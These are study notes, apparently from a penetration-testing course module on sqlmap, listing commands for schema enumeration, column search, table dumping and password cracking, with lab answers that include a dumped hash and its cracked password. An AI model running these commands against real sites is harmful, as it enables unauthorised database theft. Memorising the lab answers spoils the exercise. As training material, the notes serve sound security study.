---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# Advanced Database Enumeration

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## retrieve the structure of all of the tables

### --schema

## Searching for Data

### to search for identifier names by using the LIKE operator

- --search
  - sqlmap -u "http://www.example.com/?id=1" --search -T user
## Password Enumeration and Cracking

### sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

- do you want to crack them via a dictionary-based attack? [Y/n/q] Y
### sqlmap -u "http://www.example.com/?id=1" --passwords --batch

- clear-text password: testpass
## LAB

### What's the name of the column containing "style" in it's name? (Case #1)

- sqlmap -u http://94.237.63.176:36637/case1.php?id=1 --search -C 'style'
  - PARAMETER_STYLE
### What's the Kimberly user's password? (Case #1)

- sqlmap -u 'http://94.237.63.176:55957/case1.php?id=1' -D testdb -T users -C name,password --dump
  - do you want to crack them via a dictionary-based attack? [Y/n/q] Y
    - default answers
      - Kimberly Wright   | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609)
